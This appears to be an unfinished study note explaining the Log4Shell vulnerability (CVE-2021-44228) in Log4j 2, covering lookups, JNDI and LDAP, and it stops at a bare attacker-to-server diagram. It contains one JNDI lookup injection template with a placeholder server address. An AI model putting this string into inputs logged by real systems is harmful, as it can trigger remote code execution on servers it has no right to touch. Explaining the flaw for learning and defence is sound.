## Log4j 2 RCE Vulnerability (CVE-2021-44228)

- in log4j 2 library there is a RC Vulnerbility found.

## What is log4shell:

- it is the most critical vulnerability of the last decade.
- this vulnerability allows an attacker to execute code on a remote server; a so-called Remote Code Execution (RCE).
- Reported to Apache by Alibaba on November 24, 2021, and published in a tweet on December 9, 2021.
- Affected services include Cludflare, iCloud, Minecraft: Java Edition, Steam, Tencent QQ, and Twitter.
- Apache Software Foundation assigned the maximum CVSS severity rating of 10.
- Technical description:
	- In apache Log4j2 **versions** up to and including 2.14.1 (2.0 to 2.14.1, excluding security release 2.12.2), the **JNDI** features used in configuration, log messages, parameters do not protect against **attacker-controlled LDAP** and other JNDI related endpoints. An **attacker** who can control log messages parameters can execute code loaded from LDAP servers when **message lookup substitution** is enabled.

## Why logging?

- Can Write to files and databases, without an active console
- Log formatting
- Error tracind and debugging
- Incident tracking
- Log levels (info, error, warnings, etc)

## What is lof4j?

- Apache Log4j is a Java-based logging utility. Log4j 2.0 introduces a
	- new plugin system
	- support for properties,
	- support for JSON-based configuration
	- automatic reloading of its configuration

***Log4j create logs and have lookups.***
	- Application may log login attempts (**username, password**), form submissions and HTTP Headers (**User-Agent, X-Api-Version** etc)

## Log4j Lookups

- Lookups provide a way to **add values** to the log4j **configuration** at arbitrary places
- Syntax: ${prefix:name}
- Types of Lookups:
	- Context Map Lookup
	- Date Lookup
	- Environment Lookup
	- **JNDI Lookup**
	- Java Lookup
		- ${java:version}
		- ${java:runtime}
		- ${java:os}

## What is LDAP?

- The LDAP is an **open standard** application protocol for accessing and maitaining **distributed directory information services,** in simple information tree metaphor called information tree metaphor called a *directory information tree* (DIT).

## Why JNDI?

- **Java Naming and Directory Interface** (JNDI) provides an **API** for applications to interact with **remote objects** registered with the **RMI** registry or directory services like **LADAP**

```
Query: ${jndi:ldap"//[server_address]}
```

## The Vulnerability:

Attacker ---> Vulnerable Server (http://example.ex)

